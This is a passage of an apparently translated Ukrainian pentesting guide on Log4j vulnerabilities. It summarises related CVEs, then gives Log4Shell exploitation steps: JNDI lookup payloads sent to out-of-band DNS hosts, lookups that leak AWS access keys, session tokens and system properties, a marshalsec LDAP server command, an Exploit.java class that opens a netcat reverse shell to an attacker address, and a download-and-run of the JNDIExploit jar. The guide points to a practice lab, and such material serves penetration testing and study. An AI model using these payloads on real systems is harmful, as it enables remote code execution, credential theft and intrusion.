–°–ø–æ—á–∞—Ç–∫—É –æ—Ü—ñ–Ω—é–≤–∞–ª–æ—Å—è —è–∫ –Ω–∏–∑—å–∫–µ, –∞–ª–µ –ø—ñ–∑–Ω—ñ—à–µ –ø—ñ–¥–≤–∏—â–µ–Ω–æ –¥–æ –∫—Ä–∏—Ç–∏—á–Ω–æ–≥–æ, —Ü—è CVE —î **–≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—é –≤—ñ–¥–º–æ–≤–∏ –≤ –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞–Ω–Ω—ñ (DoS)**, —â–æ –≤–∏–Ω–∏–∫–∞—î –≤–Ω–∞—Å–ª—ñ–¥–æ–∫ –Ω–µ–ø–æ–≤–Ω–æ–≥–æ –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–Ω—è —É 2.15.0 –¥–ª—è CVE-2021-44228. –í–æ–Ω–∞ –≤–ø–ª–∏–≤–∞—î –Ω–∞ –Ω–µ—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ñ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –∞—Ç–∞–∫–∏ DoS —á–µ—Ä–µ–∑ —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–æ –ø—ñ–¥–≥–æ—Ç–æ–≤–ª–µ–Ω—ñ –∫–æ—Ä–∏—Å–Ω—ñ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è. [–¢–≤—ñ—Ç](https://twitter.com/marcioalm/status/1471740771581652995) –¥–µ–º–æ–Ω—Å—Ç—Ä—É—î –º–µ—Ç–æ–¥ –æ–±—Ö–æ–¥—É. –ü—Ä–æ–±–ª–µ–º–∞ –≤–∏—Ä—ñ—à–µ–Ω–∞ —É –≤–µ—Ä—Å—ñ—è—Ö 2.16.0 —Ç–∞ 2.12.2 —à–ª—è—Ö–æ–º –≤–∏–¥–∞–ª–µ–Ω–Ω—è —à–∞–±–ª–æ–Ω—ñ–≤ –ø–æ—à—É–∫—É –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å —Ç–∞ –≤—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è JNDI –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º.

### [CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[High]**

–í–ø–ª–∏–≤–∞—é—á–∏ –Ω–∞ **–≤–µ—Ä—Å—ñ—ó Log4j 1.x** —É –Ω–µ—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∏—Ö –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è—Ö, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å `JMSAppender`, —Ü—è CVE —î –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—é –Ω–µ–Ω–∞–¥—ñ–π–Ω–æ—ó –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó. –í–∏–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –¥–ª—è –≥—ñ–ª–∫–∏ 1.x –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–µ, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–æ–Ω–∞ –≤–∏–π—à–ª–∞ –∑ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó, —ñ —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –¥–æ `log4j-core 2.17.0`.

### [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **\[Moderate]**

–¶—è –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –≤–ø–ª–∏–≤–∞—î –Ω–∞ **—Ñ—Ä–µ–π–º–≤–æ—Ä–∫ –≤–µ–¥–µ–Ω–Ω—è –∂—É—Ä–Ω–∞–ª—ñ–≤ Logback**, –Ω–∞—Å—Ç—É–ø–Ω–∏–∫–∞ Log4j 1.x. –†–∞–Ω—ñ—à–µ –≤–≤–∞–∂–∞–ª–æ—Å—è, —â–æ –≤—ñ–Ω –±–µ–∑–ø–µ—á–Ω–∏–π, –∞–ª–µ —Ñ—Ä–µ–π–º–≤–æ—Ä–∫ –≤–∏—è–≤–∏–≤—Å—è –≤—Ä–∞–∑–ª–∏–≤–∏–º, —ñ –Ω–æ–≤—ñ –≤–µ—Ä—Å—ñ—ó (1.3.0-alpha11 —Ç–∞ 1.2.9) –±—É–ª–∏ –≤–∏–ø—É—â–µ–Ω—ñ –¥–ª—è –≤–∏—Ä—ñ—à–µ–Ω–Ω—è –ø—Ä–æ–±–ª–µ–º–∏.

### **CVE-2021-45105** **\[High]**

Log4j 2.16.0 –º—ñ—Å—Ç–∏—Ç—å –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å DoS, —â–æ —Å–ø–æ–Ω—É–∫–∞–ª–æ –¥–æ –≤–∏–ø—É—Å–∫—É `log4j 2.17.0` –¥–ª—è –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–Ω—è CVE. –ü–æ–¥—Ä–æ–±–∏—Ü—ñ –≤ –∑–≤—ñ—Ç—ñ BleepingComputer [–∑–≤—ñ—Ç—É](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/).

### [CVE-2021-44832](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)

–í–ø–ª–∏–≤–∞—é—á–∏ –Ω–∞ –≤–µ—Ä—Å—ñ—é log4j 2.17, —Ü—è CVE –≤–∏–º–∞–≥–∞—î, —â–æ–± –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞–≤ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏–π —Ñ–∞–π–ª log4j. –¶–µ –ø–µ—Ä–µ–¥–±–∞—á–∞—î –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ –∫–æ–¥—É —á–µ—Ä–µ–∑ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π JDBCAppender. –ë—ñ–ª—å—à–µ –¥–µ—Ç–∞–ª–µ–π –¥–æ—Å—Ç—É–ø–Ω–æ –≤ [–±–ª–æ–≥-–ø–æ—Å—Ç—É Checkmarx](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/).

## Log4Shell Exploitation

### Discovery

–¶—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –¥—É–∂–µ –ª–µ–≥–∫–æ –≤–∏—è–≤–∏—Ç–∏, —è–∫—â–æ –≤–æ–Ω–∞ –Ω–µ –∑–∞—Ö–∏—â–µ–Ω–∞, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–æ–Ω–∞ –Ω–∞–¥—ñ—à–ª–µ –ø—Ä–∏–Ω–∞–π–º–Ω—ñ **DNS-–∑–∞–ø–∏—Ç** –Ω–∞ –∞–¥—Ä–µ—Å—É, —è–∫—É –≤–∏ –≤–∫–∞–∑–∞–ª–∏ —É —Å–≤–æ—î–º—É –∫–æ—Ä–∏—Å–Ω–æ–º—É –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ. –¢–æ–º—É –∫–æ—Ä–∏—Å–Ω—ñ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, —Ç–∞–∫—ñ —è–∫:

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}` (–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ [canarytokens.com](https://canarytokens.org/generate))
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}` (–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ [interactsh](https://github.com/projectdiscovery/interactsh))
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ Burp Suite)
* `${jndi:ldap://2j4ayo.dnslog.cn}` (–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ [dnslog](http://dnslog.cn))
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` (–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ [huntress](https://log4shell.huntress.com))

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **–Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –æ—Ç—Ä–∏–º–∞–Ω–æ DNS-–∑–∞–ø–∏—Ç, —Ü–µ –Ω–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –¥–æ–¥–∞—Ç–æ–∫ —î –≤—Ä–∞–∑–ª–∏–≤–∏–º** (–∞–±–æ –Ω–∞–≤—ñ—Ç—å —É—Ä–∞–∑–ª–∏–≤–∏–º), –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–¥–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –π–æ–≥–æ.

{% hint style="info" %}
–ü–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ –¥–ª—è **–µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤–µ—Ä—Å—ñ—ó 2.15** –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –¥–æ–¥–∞—Ç–∏ **–æ–±—Ö—ñ–¥ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ localhost**: ${jndi:ldap://**127.0.0.1#**...}
{% endhint %}

#### **Local Discovery**

–®—É–∫–∞–π—Ç–µ **–ª–æ–∫–∞–ª—å–Ω—ñ –≤—Ä–∞–∑–ª–∏–≤—ñ –≤–µ—Ä—Å—ñ—ó** –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ –∑:
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞**

–î–µ—è–∫—ñ –∑ –ø–ª–∞—Ç—Ñ–æ—Ä–º, –∑–≥–∞–¥–∞–Ω–∏—Ö —Ä–∞–Ω—ñ—à–µ, –¥–æ–∑–≤–æ–ª—è—Ç—å –≤–∞–º –≤—Å—Ç–∞–≤–∏—Ç–∏ –¥–µ—è–∫—ñ –∑–º—ñ–Ω–Ω—ñ –¥–∞–Ω—ñ, —è–∫—ñ –±—É–¥—É—Ç—å –∑–∞–ø–∏—Å–∞–Ω—ñ, –∫–æ–ª–∏ —ó—Ö –∑–∞–ø–∏—Ç—É—é—Ç—å.\
–¶–µ –º–æ–∂–µ –±—É—Ç–∏ –¥—É–∂–µ –∫–æ—Ä–∏—Å–Ω–æ –¥–ª—è 2-—Ö —Ä–µ—á–µ–π:

* –©–æ–± **–ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏** –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å
* –©–æ–± **–µ–∫—Å—Ç—Ä–∞–≥—É–≤–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é**, –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—é

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, –≤–∏ –º–æ–≥–ª–∏ –± –∑–∞–ø–∏—Ç–∞—Ç–∏ —â–æ—Å—å –Ω–∞ –∫—à—Ç–∞–ª—Ç:\
–∞–±–æ —è–∫ `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** —ñ —è–∫—â–æ **–æ—Ç—Ä–∏–º–∞–Ω–æ DNS-–∑–∞–ø–∏—Ç –∑—ñ –∑–Ω–∞—á–µ–Ω–Ω—è–º –∑–º—ñ–Ω–Ω–æ—ó —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞**, –≤–∏ –∑–Ω–∞—î—Ç–µ, —â–æ –¥–æ–¥–∞—Ç–æ–∫ –≤—Ä–∞–∑–ª–∏–≤–∏–π.

–Ü–Ω—à–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è, —è–∫—É –≤–∏ –º–æ–≥–ª–∏ –± —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **–≤–∏—Ç—è–≥–Ω—É—Ç–∏**:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE Information

{% hint style="info" %}
–•–æ—Å—Ç–∏, —â–æ –ø—Ä–∞—Ü—é—é—Ç—å –Ω–∞ –≤–µ—Ä—Å—ñ—è—Ö JDK –≤–∏—â–µ 6u141, 7u131 –∞–±–æ 8u121, –∑–∞—Ö–∏—â–µ–Ω—ñ –≤—ñ–¥ –≤–µ–∫—Ç–æ—Ä—É –∞—Ç–∞–∫–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∫–ª–∞—Å—ñ–≤ LDAP. –¶–µ –ø–æ–≤'—è–∑–∞–Ω–æ –∑ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –¥–µ–∞–∫—Ç–∏–≤–∞—Ü—ñ—î—é `com.sun.jndi.ldap.object.trustURLCodebase`, —â–æ –∑–∞–ø–æ–±—ñ–≥–∞—î JNDI –≤—ñ–¥ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –∫–æ–¥–æ–≤–æ–≥–æ –±–∞–∑–∏ —á–µ—Ä–µ–∑ LDAP. –û–¥–Ω–∞–∫ –≤–∞–∂–ª–∏–≤–æ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ —Ü—ñ –≤–µ—Ä—Å—ñ—ó **–Ω–µ –∑–∞—Ö–∏—â–µ–Ω—ñ –≤—ñ–¥ –≤–µ–∫—Ç–æ—Ä—É –∞—Ç–∞–∫–∏ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó**.

–î–ª—è –∞—Ç–∞–∫—É—é—á–∏—Ö, —è–∫—ñ –ø—Ä–∞–≥–Ω—É—Ç—å –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ —Ü—ñ –≤–∏—â—ñ –≤–µ—Ä—Å—ñ—ó JDK, –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **–¥–æ—Å—Ç–æ–≤—ñ—Ä–Ω–∏–π –≥–∞–¥–∂–µ—Ç** —É Java-–¥–æ–¥–∞—Ç–∫—É. –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —Ç–∞–∫—ñ —è–∫ ysoserial –∞–±–æ JNDIExploit, —á–∞—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è —Ü—ñ—î—ó –º–µ—Ç–∏. –ù–∞–≤–ø–∞–∫–∏, –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –Ω–∏–∂—á–∏—Ö –≤–µ—Ä—Å—ñ–π JDK —î –≤—ñ–¥–Ω–æ—Å–Ω–æ –ø—Ä–æ—Å—Ç—ñ—à–æ—é, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü—ñ –≤–µ—Ä—Å—ñ—ó –º–æ–∂–Ω–∞ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –∫–ª–∞—Å—ñ–≤.

–î–ª—è **–¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó** (_—è–∫ –æ–±–º–µ–∂–µ–Ω–Ω—è –Ω–∞ RMI —Ç–∞ CORBA –≤–µ–∫—Ç–æ—Ä–∏_) **–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π —Ä–æ–∑–¥—ñ–ª JNDI Naming Reference** –∞–±–æ [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - Marshalsec with custom payload

–í–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Ç–µ—Å—Ç—É–≤–∞—Ç–∏ —Ü–µ –≤ **THM box:** [**https://tryhackme.com/room/solar**](https://tryhackme.com/room/solar)

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç [**marshalsec**](https://github.com/mbechler/marshalsec) (–≤–µ—Ä—Å—ñ—è jar –¥–æ—Å—Ç—É–ø–Ω–∞ [**—Ç—É—Ç**](https://github.com/RandomRobbieBF/marshalsec-jar)). –¶–µ–π –ø—ñ–¥—Ö—ñ–¥ –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î LDAP —Å–µ—Ä–≤–µ—Ä –ø–æ—Å–∏–ª–∞–Ω—å –¥–ª—è –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –∑'—î–¥–Ω–∞–Ω—å –Ω–∞ –≤—Ç–æ—Ä–∏–Ω–Ω–∏–π HTTP —Å–µ—Ä–≤–µ—Ä, –¥–µ –±—É–¥–µ —Ä–æ–∑–º—ñ—â–µ–Ω–æ –µ–∫—Å–ø–ª–æ–π—Ç:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
–©–æ–± —Å–ø–æ–Ω—É–∫–∞—Ç–∏ —Ü—ñ–ª—å –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –∫–æ–¥ –∑–≤–æ—Ä–æ—Ç–Ω–æ–≥–æ —à–µ–ª—É, —Å—Ç–≤–æ—Ä—ñ—Ç—å —Ñ–∞–π–ª Java –∑ –Ω–∞–∑–≤–æ—é `Exploit.java` –∑ –≤–º—ñ—Å—Ç–æ–º –Ω–∏–∂—á–µ:
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
–°–∫–æ–º–ø—ñ–ª—é–π—Ç–µ —Ñ–∞–π–ª Java –≤ –∫–ª–∞—Å-—Ñ–∞–π–ª –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é: `javac Exploit.java -source 8 -target 8`. –î–∞–ª—ñ, —ñ–Ω—ñ—Ü—ñ—é–π—Ç–µ **HTTP —Å–µ—Ä–≤–µ—Ä** –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó, —â–æ –º—ñ—Å—Ç–∏—Ç—å –∫–ª–∞—Å-—Ñ–∞–π–ª, –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é: `python3 -m http.server`. –ü–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ **marshalsec LDAP —Å–µ—Ä–≤–µ—Ä** –ø–æ—Å–∏–ª–∞—î—Ç—å—Å—è –Ω–∞ —Ü–µ–π HTTP —Å–µ—Ä–≤–µ—Ä.

–ó–∞–ø—É—Å—Ç—ñ—Ç—å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–ª–∞—Å—É –µ–∫—Å–ø–ª–æ–π—Ç—É –Ω–∞ –≤—Ä–∞–∑–ª–∏–≤–æ–º—É –≤–µ–±-—Å–µ—Ä–≤–µ—Ä—ñ, –Ω–∞–¥—ñ—Å–ª–∞–≤—à–∏ –∫–æ—Ä–∏—Å–Ω–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, —â–æ –Ω–∞–≥–∞–¥—É—î:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
**–ü—Ä–∏–º—ñ—Ç–∫–∞:** –¶–µ–π –µ–∫—Å–ø–ª–æ–π—Ç –∑–∞–ª–µ–∂–∏—Ç—å –≤—ñ–¥ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó Java, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤—ñ–¥–¥–∞–ª–µ–Ω–∏—Ö –∫–æ–¥–æ–≤–∏—Ö –±–∞–∑ —á–µ—Ä–µ–∑ LDAP. –Ø–∫—â–æ —Ü–µ –Ω–µ –¥–æ–∑–≤–æ–ª–µ–Ω–æ, —Ä–æ–∑–≥–ª—è–Ω—å—Ç–µ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –¥–æ–≤—ñ—Ä–µ–Ω–æ–≥–æ –∫–ª–∞—Å—É –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ –∫–æ–¥—É.

### RCE - **JNDIExploit**

{% hint style="info" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –∑ —è–∫–æ—ó—Å—å –ø—Ä–∏—á–∏–Ω–∏ –∞–≤—Ç–æ—Ä –≤–∏–¥–∞–ª–∏–≤ —Ü–µ–π –ø—Ä–æ–µ–∫—Ç –∑ github –ø—ñ—Å–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è log4shell. –í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –∫–µ—à–æ–≤–∞–Ω—É –≤–µ—Ä—Å—ñ—é –∑–∞ [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2), –∞–ª–µ —è–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–≤–∞–∂–∞—Ç–∏ —Ä—ñ—à–µ–Ω–Ω—è –∞–≤—Ç–æ—Ä–∞, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ —ñ–Ω—à–∏–π –º–µ—Ç–æ–¥ –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —Ü—ñ—î—ó —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ.

–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –≤–∏—Ö—ñ–¥–Ω–∏–π –∫–æ–¥ —É wayback machine, —Ç–æ–º—É –∞–±–æ –ø—Ä–æ–∞–Ω–∞–ª—ñ–∑—É–π—Ç–µ –≤–∏—Ö—ñ–¥–Ω–∏–π –∫–æ–¥, –∞–±–æ –≤–∏–∫–æ–Ω–∞–π—Ç–µ jar, –∑–Ω–∞—é—á–∏, —â–æ –≤–∏ –Ω–µ –∑–Ω–∞—î—Ç–µ, —â–æ –≤–∏–∫–æ–Ω—É—î—Ç–µ.
{% endhint %}

–î–ª—è —Ü—å–æ–≥–æ –ø—Ä–∏–∫–ª–∞–¥—É –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ —Ü–µ–π **–≤—Ä–∞–∑–ª–∏–≤–∏–π –≤–µ–±-—Å–µ—Ä–≤–µ—Ä –¥–ª—è log4shell** –Ω–∞ –ø–æ—Ä—Ç—É 8080: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_–≤ README –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ, —è–∫ –π–æ–≥–æ –∑–∞–ø—É—Å—Ç–∏—Ç–∏_). –¶—è –≤—Ä–∞–∑–ª–∏–≤–∞ –ø—Ä–æ–≥—Ä–∞–º–∞ –≤–µ–¥–µ –∂—É—Ä–Ω–∞–ª –∑ –≤—Ä–∞–∑–ª–∏–≤–æ—é –≤–µ—Ä—Å—ñ—î—é log4shell –≤–º—ñ—Å—Ç—É –∑–∞–≥–æ–ª–æ–≤–∫–∞ HTTP –∑–∞–ø–∏—Ç—É _X-Api-Version_.

–ü–æ—Ç—ñ–º –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ñ–∞–π–ª **JNDIExploit** jar —ñ –≤–∏–∫–æ–Ω–∞—Ç–∏ –π–æ–≥–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
–ü—ñ—Å–ª—è –ø—Ä–æ—á–∏—Ç–∞–Ω–Ω—è –∫–æ–¥—É –≤—Å—å–æ–≥–æ –∑–∞ –∫—ñ–ª—å–∫–∞ —Ö–≤–∏–ª–∏–Ω, —É _com.feihong.ldap.LdapServer_ —Ç–∞ _com.feihong.ldap.HTTPServer_ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, —è–∫ **—Å—Ç–≤–æ—Ä—é—é—Ç—å—Å—è LDAP —Ç–∞ HTTP —Å–µ—Ä–≤–µ—Ä–∏**. LDAP —Å–µ—Ä–≤–µ—Ä –∑—Ä–æ–∑—É–º—ñ—î, —è–∫–∏–π payload –ø–æ—Ç—Ä—ñ–±–Ω–æ –æ–±—Ä–æ–±–∏—Ç–∏, —ñ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–∏—Ç—å –∂–µ—Ä—Ç–≤—É –Ω–∞ HTTP —Å–µ—Ä–≤–µ—Ä, —è–∫–∏–π –±—É–¥–µ –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞—Ç–∏ –µ–∫—Å–ø–ª–æ–π—Ç.\
–£ _com.feihong.ldap.gadgets_ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **–¥–µ—è–∫—ñ —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω—ñ –≥–∞–¥–∂–µ—Ç–∏**, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –±–∞–∂–∞–Ω–æ—ó –¥—ñ—ó (–ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–¥). –ê –≤ _com.feihong.ldap.template_ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ —Ä—ñ–∑–Ω—ñ –∫–ª–∞—Å–∏ —à–∞–±–ª–æ–Ω—ñ–≤, —è–∫—ñ **–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏–º—É—Ç—å –µ–∫—Å–ø–ª–æ–π—Ç–∏**.

